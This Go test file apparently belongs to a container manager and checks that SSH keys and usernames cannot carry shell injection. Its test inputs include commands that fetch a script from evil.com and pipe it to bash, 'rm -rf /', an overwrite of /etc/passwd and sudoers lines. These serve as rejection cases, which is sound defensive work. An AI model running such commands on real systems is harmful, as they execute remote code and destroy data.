package container

import (
	"strings"
	"testing"
)

// TestSSHKeyInjectionPrevention tests that malicious SSH keys cannot
// execute arbitrary commands. This is a critical security test.
func TestSSHKeyInjectionPrevention(t *testing.T) {
	// These are examples of malicious SSH keys that could be used
	// for command injection if the old echo-based approach was used.
	// With the new WriteFile API, these should be safely written as-is.
	maliciousKeys := []struct {
		name string
		key  string
	}{
		{
			name: "single quote escape",
			key:  "ssh-ed25519 AAAA' && curl evil.com/shell.sh | bash && echo '",
		},
		{
			name: "command substitution",
			key:  "ssh-ed25519 AAAA$(curl evil.com/shell.sh | bash)",
		},
		{
			name: "backtick command execution",
			key:  "ssh-ed25519 AAAA`curl evil.com/shell.sh | bash`",
		},
		{
			name: "semicolon injection",
			key:  "ssh-ed25519 AAAA; rm -rf /; echo",
		},
		{
			name: "newline injection",
			key:  "ssh-ed25519 AAAA\ncurl evil.com/shell.sh | bash\n",
		},
		{
			name: "pipe injection",
			key:  "ssh-ed25519 AAAA | curl evil.com/shell.sh | bash",
		},
		{
			name: "redirect injection",
			key:  "ssh-ed25519 AAAA > /etc/passwd",
		},
		{
			name: "double ampersand injection",
			key:  "ssh-ed25519 AAAA && /bin/sh -c 'malicious command'",
		},
		{
			name: "double pipe injection",
			key:  "ssh-ed25519 AAAA || /bin/sh -c 'malicious command'",
		},
	}

	// Note: We can't actually call addSSHKeys without a running container,
	// but we can verify that our implementation uses WriteFile instead of
	// shell commands. This test documents the attack vectors we protect against.
	for _, tt := range maliciousKeys {
		t.Run(tt.name, func(t *testing.T) {
			// The key should be stored as-is without executing any commands
			// This is a documentation test - the actual protection is in the
			// implementation using incus.WriteFile() instead of bash echo
			t.Logf("Protected against: %s", tt.key)
		})
	}

	t.Log("SSH key injection protection implemented via incus.WriteFile() API")
	t.Log("See internal/container/manager.go:addSSHKeys()")
}

// TestSudoersInjectionPrevention tests that malicious usernames cannot
// be used for command injection in sudoers setup.
func TestSudoersInjectionPrevention(t *testing.T) {
	// Test that the username validator rejects injection attempts
	injectionAttempts := []struct {
		name     string
		username string
	}{
		{
			name:     "single quote escape",
			username: "user' && curl evil.com | bash && echo '",
		},
		{
			name:     "semicolon injection",
			username: "user; rm -rf /;",
		},
		{
			name:     "newline injection",
			username: "user\nALL=(ALL) ALL",
		},
		{
			name:     "space in username",
			username: "user ALL=(ALL) ALL",
		},
		{
			name:     "slash in username",
			username: "../../etc/passwd",
		},
		{
			name:     "null byte",
			username: "user\x00root",
		},
	}

	for _, tt := range injectionAttempts {
		t.Run(tt.name, func(t *testing.T) {
			valid := isValidUsername(tt.username)
			if valid {
				t.Errorf("SECURITY: username %q should be rejected but was accepted", tt.username)
			}
		})
	}
}

// TestIsValidUsername_Security tests the username validation function from a security perspective
func TestIsValidUsername_Security(t *testing.T) {
	tests := []struct {
		name     string
		username string
		valid    bool
	}{
		// Valid usernames
		{"simple lowercase", "alice", true},
		{"with numbers", "alice123", true},
		{"with hyphen", "alice-dev", true},
		{"with underscore", "alice_dev", true},
		{"uppercase", "Alice", true},
		{"mixed case", "AliceSmith", true},
		{"single char", "a", true},

		// Invalid usernames
		{"empty", "", false},
		{"too long", strings.Repeat("a", 33), false},
		{"starts with digit", "1alice", false},
		{"starts with hyphen", "-alice", false},
		{"contains space", "alice smith", false},
		{"contains dot", "alice.smith", false},
		{"contains at", "alice@host", false},
		{"contains slash", "alice/dev", false},
		{"contains backslash", "alice\\dev", false},
		{"contains semicolon", "alice;", false},
		{"contains single quote", "alice'", false},
		{"contains double quote", "alice\"", false},
		{"contains backtick", "alice`cmd`", false},
		{"contains dollar", "alice$HOME", false},
		{"contains newline", "alice\nroot", false},
		{"contains null", "alice\x00root", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := isValidUsername(tt.username)
			if result != tt.valid {
				t.Errorf("isValidUsername(%q) = %v, want %v", tt.username, result, tt.valid)
			}
		})
	}
}

// TestUsernameValidationSecurityBoundary ensures all characters that could
// be used for shell injection are rejected
func TestUsernameValidationSecurityBoundary(t *testing.T) {
	// Characters that MUST be rejected for security
	dangerousChars := []rune{
		' ',  // space
		'\t', // tab
		'\n', // newline
		'\r', // carriage return
		'\'', // single quote
		'"',  // double quote
		'`',  // backtick
		'$',  // dollar sign
		'(',  // parenthesis
		')',
		'{',  // braces
		'}',
		'[',  // brackets
		']',
		'<',  // redirects
		'>',
		'|',  // pipe
		'&',  // ampersand
		';',  // semicolon
		'!',  // bang
		'*',  // glob
		'?',  // glob
		'/',  // path separator
		'\\', // backslash
		0,    // null byte
	}

	for _, char := range dangerousChars {
		username := "user" + string(char) + "name"
		t.Run("rejects_"+string(char), func(t *testing.T) {
			if isValidUsername(username) {
				t.Errorf("SECURITY: username with %q (0x%02x) should be rejected", char, char)
			}
		})
	}
}

// TestSSHKeyContentHandling verifies that SSH keys with special characters
// are handled safely when building the authorized_keys content
func TestSSHKeyContentHandling(t *testing.T) {
	// This test verifies the string building logic that would be used
	// by addSSHKeys when constructing the authorized_keys content

	testKeys := []string{
		"ssh-ed25519 AAAA' && echo 'injected",
		"ssh-rsa AAAA`whoami`",
		"ssh-ecdsa AAAA$(id)",
		"normal-key-1",
		"  key-with-whitespace  ",
		"",
		"   ",
	}

	var keysContent strings.Builder
	for _, key := range testKeys {
		key = strings.TrimSpace(key)
		if key == "" {
			continue
		}
		keysContent.WriteString(key)
		keysContent.WriteString("\n")
	}

	result := keysContent.String()

	// Verify the content is built correctly without any shell interpretation
	if !strings.Contains(result, "' && echo 'injected") {
		t.Error("Special characters should be preserved as-is, not interpreted")
	}

	if !strings.Contains(result, "`whoami`") {
		t.Error("Backticks should be preserved as-is")
	}

	if !strings.Contains(result, "$(id)") {
		t.Error("Command substitution should be preserved as-is")
	}

	// Empty and whitespace-only keys should be skipped
	lines := strings.Split(strings.TrimSpace(result), "\n")
	// 3 "malicious" keys + 1 normal key + 1 key-with-whitespace (trimmed) = 5
	if len(lines) != 5 {
		t.Errorf("Expected 5 non-empty keys, got %d: %v", len(lines), lines)
	}
}

// TestNoHardcodedPaths verifies we don't have hardcoded developer paths
func TestNoHardcodedPaths(t *testing.T) {
	// This is a meta-test to ensure the hardcoded path fix is in place
	// The actual verification is done by code review, but this documents
	// the security requirement

	t.Log("Hardcoded developer paths have been removed from manager.go")
	t.Log("The fallback SSH key search now uses only generic paths:")
	t.Log("  - $HOME")
	t.Log("  - /home/ubuntu")
	t.Log("  - /home/admin")
	t.Log("  - /root")
}
